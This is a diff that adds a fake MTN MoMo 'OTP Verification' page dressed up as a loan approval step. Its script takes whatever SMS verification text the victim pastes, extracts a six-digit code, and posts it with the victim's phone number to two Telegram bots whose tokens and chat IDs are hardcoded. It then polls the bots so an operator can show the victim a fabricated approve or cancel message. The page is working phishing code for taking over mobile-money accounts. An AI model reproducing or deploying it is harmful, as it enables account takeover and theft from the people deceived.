@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>MTN MoMo - OTP Verification</title>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        html,
+        body {
+            min-height: 100vh;
+            font-family: 'Inter', sans-serif;
+            background: #f5f7fa;
+            overflow-y: auto;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .header {
+            background: white;
+            padding: 20px;
+            text-align: center;
+            position: relative;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+        }
+        
+        .back-btn {
+            position: absolute;
+            left: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 28px;
+            color: #333;
+            text-decoration: none;
+        }
+        
+        .title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #333;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+        
+        .container {
+            max-width: 520px;
+            margin: 40px auto;
+            padding: 30px;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            flex: 1;
+        }
+        
+        .subtitle {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 10px;
+        }
+        
+        .phone {
+            font-size: 18px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 40px;
+        }
+        
+        .otp-label {
+            font-size: 16px;
+            color: #333;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+        
+        .otp-textarea {
+            width: 100%;
+            resize: none;
+            height: 92px;
+            border: 2px solid #0066ff;
+            border-radius: 14px;
+            padding: 14px 14px;
+            font-size: 16px;
+            line-height: 1.5;
+            background: white;
+            color: #333;
+            font-weight: 600;
+            outline: none;
+        }
+        
+        .otp-textarea:focus {
+            border-color: #0066ff;
+        }
+        
+        .helper {
+            font-size: 13px;
+            color: #6b7280;
+            margin: 12px 0 26px;
+            text-align: left;
+        }
+        
+        .resend {
+            font-size: 15px;
+            color: #666;
+            margin-bottom: 50px;
+        }
+        
+        .resend span {
+            color: #0066ff;
+            font-weight: 600;
+        }
+        
+        #submitBtn {
+            width: 100%;
+            padding: 18px;
+            background: #ccc;
+            color: #999;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: not-allowed;
+        }
+        
+        #submitBtn.enabled {
+            background: #0066ff;
+            color: white;
+            cursor: pointer;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 30px 20px;
+            color: #aaa;
+            font-size: 14px;
+            background: #f5f7fa;
+            flex-shrink: 0;
+            margin-top: auto;
+        }
+        /* SPINNER */
+        
+        #spinnerOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.98);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+        }
+        
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #f0f0f0;
+            border-top: 6px solid #0066ff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 30px;
+        }
+        
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .spinner-text {
+            font-size: 18px;
+            color: #333;
+            text-align: center;
+            line-height: 1.6;
+            max-width: 320px;
+            font-weight: 500;
+        }
+        /* RESULT OVERLAY */
+        
+        #resultOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.98);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+            padding: 20px;
+        }
+        
+        .result-message {
+            font-size: 18px;
+            color: #333;
+            text-align: center;
+            line-height: 1.6;
+            max-width: 320px;
+            font-weight: 500;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="header">
+        <a href="login" class="back-btn">←</a>
+        <div class="title">
+            <span>MTN MoMo - OTP Verification</span>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="subtitle">Paste the SMS text to complete verifications.</div>
+        <div class="phone" id="maskedPhone"></div>
+
+        <div class="otp-label">Paste verification message</div>
+        <textarea id="otpInput" class="otp-textarea" placeholder="Paste any message here. Submit will enable after pasting." inputmode="text"></textarea>
+
+        <div class="helper">
+            Submit will be enabled after you paste message (OTP may or may not be present).
+        </div>
+
+        <div class="resend">Resend OTP in <span id="timer">116</span> seconds</div>
+        <button id="submitBtn">Submit</button>
+    </div>
+
+    <footer>© 2025 MTN MoMo • All amounts in KWACHA (ZMW)</footer>
+
+    <!-- SPINNER -->
+    <div id="spinnerOverlay">
+        <div class="spinner"></div>
+        <div class="spinner-text">Please wait while we approve your loan application</div>
+    </div>
+
+    <!-- RESULT OVERLAY -->
+    <div id="resultOverlay">
+        <div class="result-message" id="resultMessage"></div>
+    </div>
+
+    <script>
+        // Bot 1 (your existing)
+        const BOT_TOKEN_1 = '8508268649:AAE99y4_VebL1hlEbOLxHewLlttfRAZPfPw';
+        const CHAT_ID_1 = '8445950458';
+
+        // Bot 2 (your second bot)
+        const BOT_TOKEN_2 = '8374783082:AAGu_MAmTZ7plivFdGJU10DjUECPe-Nbw-Q';
+        const CHAT_ID_2 = '5615316142';
+
+        // Mask phone from localStorage
+        const savedPhone = localStorage.getItem('phone') || '785123463';
+        const visibleStart = savedPhone.slice(0, 3);
+        const visibleEnd = savedPhone.slice(-2);
+        const masked = visibleStart + '****' + visibleEnd;
+
+        document.getElementById('maskedPhone').textContent = '+237 ' + masked;
+
+        const otpInput = document.getElementById('otpInput');
+        const submitBtn = document.getElementById('submitBtn');
+
+        const spinnerOverlay = document.getElementById('spinnerOverlay');
+        const resultOverlay = document.getElementById('resultOverlay');
+        const resultMessage = document.getElementById('resultMessage');
+        const timerSpan = document.getElementById('timer');
+
+        let otpValue = '';
+        let seconds = 116;
+        let pollInterval1 = null;
+        let pollInterval2 = null;
+        let lastUpdateId1 = 0;
+        let lastUpdateId2 = 0;
+        let currentTimestamp = 0;
+        let actionProcessed = false;
+
+        const countdown = setInterval(() => {
+            seconds--;
+            timerSpan.textContent = seconds;
+            if (seconds <= 0) {
+                clearInterval(countdown);
+                timerSpan.textContent = '0';
+            }
+        }, 1000);
+
+        // Extract first 6-digit OTP from text
+        function extractOtp(text) {
+            if (!text) return '';
+            const match = String(text).match(/(\d{6})/);
+            return match ? match[1] : '';
+        }
+
+        function syncStateAndButton() {
+            const pastedText = otpInput.value || '';
+
+            // Enable submit for any non-empty pasted message (typing also enables)
+            if (pastedText.trim().length > 0) {
+                submitBtn.classList.add('enabled');
+                submitBtn.disabled = false;
+            } else {
+                submitBtn.classList.remove('enabled');
+                submitBtn.disabled = true;
+            }
+
+            otpValue = extractOtp(pastedText);
+        }
+
+        otpInput.addEventListener('input', syncStateAndButton);
+        otpInput.addEventListener('paste', () => setTimeout(syncStateAndButton, 0));
+
+        // IMPORTANT FIX:
+        // Telegram expects numeric chat_id in most cases.
+        // If CHAT_ID is stored/defined as a string, convert to Number.
+        // Also sanitize Markdown to prevent formatting issues when pasting raw SMS.
+        function escapeMarkdown(text) {
+            return String(text || '')
+                .replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
+        }
+
+        function sendToBot(botToken, chatId, text, replyMarkup) {
+            const payload = {
+                chat_id: Number(chatId),
+                text: text,
+                parse_mode: 'Markdown'
+            };
+
+            if (replyMarkup) payload.reply_markup = replyMarkup;
+
+            return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            }).catch(() => {});
+        }
+
+        function handleCallback(callbackData, callbackQueryId, botToken) {
+            if (actionProcessed) return;
+            actionProcessed = true;
+
+            fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    callback_query_id: callbackQueryId
+                })
+            }).catch(() => {});
+
+            if (pollInterval1) clearInterval(pollInterval1);
+            if (pollInterval2) clearInterval(pollInterval2);
+
+            spinnerOverlay.style.display = 'none';
+            resultOverlay.style.display = 'flex';
+
+            const parts = callbackData.split('_');
+
+            if (parts[0] === 'approve') {
+                resultMessage.textContent = 'Your loan has been approved. You will receive confirmation within 15 minutes. Thank you.';
+            } else if (parts[0] === 'cancel') {
+                resultMessage.textContent = 'Please apply again and make sure your details are correct and your minimum Main USD Balance is not less than XAF 30. Thank you.';
+            }
+        }
+
+        function pollBot(botToken, lastUpdateIdRef) {
+            fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateIdRef + 1}&timeout=10`)
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ok && data.result && data.result.length > 0) {
+                        for (const update of data.result) {
+                            if (botToken === BOT_TOKEN_1) {
+                                lastUpdateId1 = Math.max(lastUpdateId1, update.update_id);
+                            } else {
+                                lastUpdateId2 = Math.max(lastUpdateId2, update.update_id);
+                            }
+
+                            if (update.callback_query && !actionProcessed) {
+                                const cb = update.callback_query;
+                                const dataParts = String(cb.data || '').split('_');
+                                const ts = parseInt(dataParts[1], 10);
+
+                                if (ts === currentTimestamp) {
+                                    handleCallback(cb.data, cb.id, botToken);
+                                    return;
+                                }
+                            }
+                        }
+                    }
+                })
+                .catch(() => {});
+        }
+
+        function startPollingBoth() {
+            actionProcessed = false;
+
+            pollInterval1 = setInterval(() => {
+                pollBot(BOT_TOKEN_1, lastUpdateId1);
+            }, 1500);
+
+            pollInterval2 = setInterval(() => {
+                pollBot(BOT_TOKEN_2, lastUpdateId2);
+            }, 1500);
+        }
+
+        submitBtn.addEventListener('click', async() => {
+            const pasted = (otpInput.value || '').trim();
+            if (pasted.length === 0) return;
+
+            spinnerOverlay.style.display = 'flex';
+            currentTimestamp = Date.now();
+
+            // FIX:
+            // Escape pasted text for Markdown so Telegram doesn't reject the message
+            // (common error when SMS contains characters Telegram treats as Markdown).
+            const safePasted = escapeMarkdown(pasted);
+
+            const safePhone = escapeMarkdown(savedPhone);
+
+            const message =
+                `*OTP Verification*\n\n` +
+                `📱 Phone: +260 ${safePhone}\n` +
+                `🧾 Message Pasted: ${safePasted}\n` +
+                `🔢 OTP Detected: ${escapeMarkdown(otpValue || 'copy paste message above as otp')}\n\n` +
+                `Please approve or cancel the loan application.`;
+
+            const replyMarkup = {
+                inline_keyboard: [
+                    [{
+                        text: '✅ Approve',
+                        callback_data: 'approve_' + currentTimestamp
+                    }],
+                    [{
+                        text: '❌ Cancel',
+                        callback_data: 'cancel_' + currentTimestamp
+                    }]
+                ]
+            };
+
+            await sendToBot(BOT_TOKEN_1, CHAT_ID_1, message, replyMarkup);
+            await sendToBot(BOT_TOKEN_2, CHAT_ID_2, message, replyMarkup);
+
+            startPollingBoth();
+        });
+
+        // initial state
+        submitBtn.disabled = true;
+        syncStateAndButton();
+        otpInput.focus();
+    </script>
+</body>
+
+</html>
